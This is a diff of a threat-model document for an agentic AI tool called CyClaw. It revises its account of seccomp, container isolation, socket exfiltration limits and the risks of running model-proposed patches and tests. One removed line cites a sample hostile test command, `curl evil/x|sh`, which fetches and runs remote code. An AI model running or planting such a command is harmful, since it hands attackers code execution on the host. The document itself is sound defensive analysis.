@@ -58,7 +58,7 @@ multi-tenant workloads.
 | **Uncontrolled external model calls** | Triple-gate: `mode=hybrid` **and** the selected provider's `grok.enabled`/`claude.enabled` **and** `user_confirmed_online` | `graph.py`, `config.yaml` |
 | **Telemetry / data exfil via tracing** | Telemetry-kill env vars set before any import, by **every** entry point (gateway, MCP server, indexer CLI) from one shared mapping — an ambient value in the operator's environment is overwritten, not inherited; HF Hub network calls are additionally cut off via `local_files_only=True` once the embedding model is confirmed cached on disk (the `HF_HUB_OFFLINE`/`TRANSFORMERS_OFFLINE` env vars alone do not gate this in-process — huggingface_hub latches that constant at its own import time, which the eligibility probe itself triggers before the env vars are set; `local_files_only` is passed directly to `SentenceTransformer(...)` instead, which gates independently); raw query text never persisted (hashes only) | `utils/telemetry_kill.py`, `gate.py`, `mcp_hybrid_server.py`, `retrieval/vector_store.py`, `retrieval/embeddings.py`, `utils/logger.py` |
 | **DoS (request flood / runaway process)** | Per-IP rate limit (60/min); container `mem`/`pids`/`cpus` limits | `utils/ratelimit.py`, `docker-compose.yml` |
-| **Compromised out-of-band subprocess** (rclone/gh) | argv-list only (no `shell=True`); absolute binary paths; seccomp profile; non-root; `no-new-privileges`; `cap_drop: ALL`; read-only rootfs | `sync/`, `agentic/`, `Dockerfile`, `docker-compose.yml`, `deploy/seccomp/` |
+| **Compromised out-of-band subprocess** (rclone/gh) | argv-list only (no `shell=True`); absolute binary paths; Docker builtin seccomp; non-root; `no-new-privileges`; `cap_drop: ALL`; read-only rootfs | `sync/`, `agentic/`, `Dockerfile`, `docker-compose.yml`, `deploy/seccomp/` |
 
 ---
 
@@ -73,8 +73,11 @@ Container/OS-level controls currently enforced (see `Dockerfile` +
 - **`cap_drop: ALL`** — zero Linux capabilities.
 - **Read-only root filesystem** with explicit writable carve-outs
   (`data`/`index`/`logs`/`checkpoints`/`.emb_cache` + `tmpfs:/tmp`).
-- **seccomp profile** applied (`deploy/seccomp/sync-rclone.json`) — blocks
-  `mount`, `ptrace`, `reboot`, etc.
+- **Docker's engine-maintained builtin seccomp profile** is explicitly selected
+  even if the daemon default is customized or unconfined. It
+  blocks `mount`, `ptrace`, `reboot`, `bpf`, `io_uring_*`, restricted socket
+  families, and other high-risk calls. The former repository profiles were
+  removed because they were untraced and could not plausibly boot the gate.
 - **Resource ceilings** (`mem_limit`, `pids_limit`, `cpus`).
 - **Optional eBPF detection** (Falco, `deploy/falco/`) — disabled by default;
   logs anomalous exec/write/egress on the agentic & sync paths.
@@ -105,20 +108,24 @@ topology=policy, triple-gated external, audit convergence, soul governance) and
   `PIP_NO_INDEX`) is a best-effort software control, not a network namespace or
   firewall. It stops the common case — an HTTP-library-based request, or an
   accidental secret-env leak into a check's output — and does **not** stop a
-  raw socket connection, which never consults `HTTPS_PROXY`. Treat any claim
+  direct ordinary TCP/UDP socket, which never consults `HTTPS_PROXY`. Treat any claim
   that a verified worktree "had no network access" as unverified until a real
   namespace/firewall control exists (§6, stage 5).
-- **Kernel / hypervisor escape.** There is **no microVM** (gVisor/Firecracker).
-  Container isolation shares the host kernel. A kernel-level escape is not
-  contained. This is acceptable *only* because the workload is not untrusted code.
+- **Kernel / hypervisor escape.** There is **no per-workload microVM**
+  (gVisor/Firecracker). Container isolation shares the container host's Linux
+  kernel. On Docker Desktop that kernel is in the managed Linux VM rather than
+  macOS itself, but a container escape still compromises that VM; the desktop
+  hypervisor is only the next boundary. This is acceptable only while the
+  workload and host root remain trusted.
 - **Hostile local root.** The host operator is trusted. CyClaw does not defend
   against a malicious root on the same machine.
 - **Internet-facing / public multi-user deployment.** The loopback bind, CORS,
   and Host allow-list assume a trusted local caller. Exposing the port publicly
   voids the threat model.
-- **Strong syscall *blocking* on the gate process.** The current seccomp profile
-  permits the broad set the rclone/agentic subprocesses need. A tight,
-  gate-specific block-list is **roadmap**, not present (see §6).
+- **Tight gate-specific syscall blocking.** Docker's builtin seccomp profile is
+  enforced, but a trace-derived gate profile is not. It must be generated and
+  replayed for the exact image on `arm64` and `amd64`; `/ops` children require
+  a separate profile or a broader union policy (see §6).
 - **Confidentiality against a compromised Ollama / Grok / Claude endpoint.** Prompt and
   retrieved context are sent to the configured model; trust in that endpoint is
   assumed.
@@ -128,11 +135,12 @@ topology=policy, triple-gated external, audit convergence, soul governance) and
 
 ---
 
-## 5. Why microVM isolation is **not** required here
+## 5. Why microVM isolation is **not yet** required here
 
-A 2026 review may reflexively call for gVisor/Firecracker microVMs around
-"agentic code that can touch fs/sql." For CyClaw that recommendation targets a
-threat that the architecture has already removed:
+A 2026 review may call for gVisor/Firecracker around "agentic code that can
+touch fs/sql." For the shipped CyClaw model that control remains conditional,
+not because execution risk was removed, but because the operator, host, target
+repository, and explicitly enabled workload are trusted and single-tenant:
 
 - **GitHub writes are implemented but disarmed** (amended by P10 — see the
   fourth amendment in §5). `agentic/writer.py` ships `EXECUTION_ENABLED = False`,
@@ -179,7 +187,7 @@ and the invariant guard as real subprocesses over a worktree. This section's
 own conclusion — that microVM containment isn't needed — still holds, but for a
 narrower and more precise reason than "nothing executes":
 
-- **The code is not untrusted third-party code.** It is either nothing yet (as
+- **The shipped contract does not accept anonymous third-party workloads.** It is either nothing yet (as
   of this amendment, no live caller produces a worktree with a model-authored
   diff in it — see the module's own docstring for exactly what's wired and what
   isn't; **superseded by the third amendment below, where that caller now
@@ -189,7 +197,10 @@ narrower and more precise reason than "nothing executes":
   the operator's own pinned dev toolchain (`pytest`/`ruff`/the invariant guard —
   not an arbitrary command the patch gets to choose). This is a materially
   different threat than "run whatever an anonymous multi-tenant user uploads,"
-  which is the threat gVisor/Firecracker actually target.
+  which is the threat gVisor/Firecracker primarily target. The later amendments
+  supersede the "nothing yet" state: the real-repo path now exists, remains
+  default-off and human-gated, and is only a soft process boundary. If the
+  target repository or its tests are untrusted, Stage 5 becomes mandatory.
 
   **[Second amendment, added alongside the loop driver and git-write surface.]**
   Two of the three pieces that sentence called "future phase" now exist, each
@@ -204,7 +215,7 @@ narrower and more precise reason than "nothing executes":
     clone. It cannot produce a worktree for the executor to run against.
   - **A local git-write surface** (`agentic.deepagent_github.repo_workspace.
     RepoWorkspaceTools.checkout_branch`/`add`/`commit`/`diff`) can now commit
-    inside the jailed clone `RepoWorkspaceTools.clone()` populates — still
+    inside the path-scoped clone `RepoWorkspaceTools.clone()` populates — still
     local only (no `push`, no GitHub API call), gated on its own
     default-`False` `deepagent_github.allow_git_write_tools` flag, and with
     the committer identity always forced to this project's own convention
@@ -269,8 +280,9 @@ narrower and more precise reason than "nothing executes":
   hard sandbox by having a real caller. A verification check that itself
   executes attacker-shaped code (a hostile test file the model proposed, that
   the caller's own declared checks happen to run) carries the same residual
-  as before — jailed worktree, scrubbed env, wall-clock timeout, no inherited
-  secrets, no raw-socket defense. An operator should read "accepted" as "the
+  as before — a pinned working directory (not a filesystem jail), scrubbed env,
+  and wall-clock timeout. API-key variables are removed, but `HOME` remains
+  inherited and ordinary sockets remain available. An operator should read "accepted" as "the
   checks I named passed against this patch," not as "this patch is safe" —
   the human `reason` and `confirm` gates exist so that reading is a deliberate
   choice, not an assumption baked into the tooling.
@@ -304,14 +316,18 @@ narrower and more precise reason than "nothing executes":
   `cmd_real_repo_run`/`finalize_real_repo_change` use that union rather than
   the last iteration's own list.
 - **The residual risk this changes is real and is named, not hidden.** A
-  hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
-  genuinely can attempt to run arbitrary code within the executor subprocess's
-  own privileges. The compensating controls are: a jailed worktree (nothing
-  outside it is reachable through the checks themselves), a scrubbed,
-  network-hostile environment (soft, not hard — see §4's new bullet above), a
-  hard per-check wall-clock timeout, `check=False` so a non-zero exit is data
-  rather than an exception, and no inherited secrets (API keys are not in the
-  allowlisted environment). None of these is a kernel-level boundary.
+  hostile test file (for example a `conftest.py` with a direct network or file
+  operation) can run arbitrary code with the executor subprocess's privileges.
+  The compensating controls are a pinned `cwd`, a scrubbed but not empty
+  environment, fixed caller-declared argv, a hard per-check wall-clock timeout,
+  and `check=False` so non-zero exit is data rather than an exception. None is a
+  filesystem or network jail. In the shipped Compose container, the process can
+  read anything UID 1000 can read and write the six mounted carve-outs. In a
+  native macOS run, it executes as the operator account and can reach every
+  operator-readable or operator-writable path. Both variants can use ordinary
+  TCP/UDP sockets and see the inherited `HOME`. API keys are removed from the
+  child environment, but files or credential helpers beneath `HOME` are not
+  made unreachable.
 - **What this does NOT change:** GitHub writes remain unreachable on a shipped
   checkout (see the fourth amendment below, which supersedes the phrase
   "hard-killed" without changing the shipped posture), SQL is still
@@ -481,19 +497,32 @@ not attacker-chosen at the command level.
 
 ## 6. Hardening maturity ladder
 
+**Production isolation reality: 4/10 relative to hostile-workload containment
+with gVisor/Firecracker.** The current baseline is proportionate for the stated
+trusted, single-operator model, but it does not contain a container-host kernel
+escape, ordinary-socket exfiltration, destructive writes inside carve-outs, or
+hostile verification code. Falco is detection-only and disabled by default.
+
 | Stage | Control | Status |
 |---|---|---|
 | 0 | Loopback bind, non-root, telemetry-kill, injection filter, topology invariants | ✅ Done |
-| 1 | `no-new-privileges`, `cap_drop: ALL`, read-only rootfs, resource limits, seccomp on rclone/agentic path | ✅ Done |
+| 1 | `no-new-privileges`, `cap_drop: ALL`, read-only rootfs, resource limits, explicit Docker builtin seccomp | ✅ Enforced |
 | 2 | eBPF **detection** (Falco) over agentic/sync/gate, disabled-by-default | ✅ Scaffold shipped (`deploy/falco/`) |
-| 3 | eBPF-**profiled**, tight gate-specific seccomp block-list (replace the broad profile) | 🔜 Roadmap — needs syscall traces first |
-| 4 | Landlock / AppArmor profiles for filesystem confinement | 🔜 Roadmap |
-| 5 | gVisor / Firecracker microVM around any future *untrusted-workload* mode | ⏸ Conditional — only if the untrusted-exec threat appears |
+| 3 | eBPF-profiled, tight gate-specific seccomp allowlist | 🟡 Capture procedure shipped; native traces/replay pending |
+| 4 | AppArmor filesystem/network confinement; Landlock equivalent | 🟡 Opt-in single-container profile shipped; native enforcement pending; Landlock deferred |
+| 5 | gVisor / Firecracker around any future *untrusted-workload* mode | ⏸ Not justified; mandatory only if the threat model changes |
 
-Stage 3 deliberately depends on Stage 2: the minimal `deploy/seccomp/gate-seccomp.json`
-floor (16 syscalls) cannot boot `uvicorn`+`torch`+`chromadb`, so a correct
-gate-specific profile must be *generated from real eBPF traces*, not hand-guessed.
-Until then the gate runs under the broader, working profile.
+Stage 3 deliberately depends on real tracing. The former 17-syscall x86-only
+floor and the applied sync/rclone profile were deleted because neither was a
+validated gate policy. A correct profile must be generated from real eBPF
+traces, reviewed against the matching Moby default without dropping its
+argument/capability filters, and replayed on both supported architectures.
+Until then the gate runs under Docker's builtin. Stage 4's candidate confines
+the whole gate container: external `/ops` executables fail closed, while
+Python-only `/ops` children remain possible and inherit the same profile. It is
+not process-role isolation; optional services need their own profiles. Stage 5
+criteria and the full operator procedure are in
+[`docs/SECCOMP_EBPF_HARDENING.md`](./SECCOMP_EBPF_HARDENING.md).
 
 ---
 
